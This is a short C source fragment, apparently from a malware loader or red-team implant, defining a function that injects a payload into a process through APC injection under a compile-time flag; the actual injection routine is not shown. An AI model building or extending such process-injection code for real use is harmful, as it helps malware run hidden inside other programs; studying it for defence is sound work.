#include "injection.h"

BOOL inject_payload(LPVOID Payload, SIZE_T PayloadSize) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    BOOL bSuccess = FALSE;

    #ifdef APC_INJECTION
        DebugPrint("[#] Injecting Payload via APC ...\n");
        bSuccess = InjectPayloadViaAPC(hProcess, hThread, Payload, PayloadSize);
    #endif

    return bSuccess;
}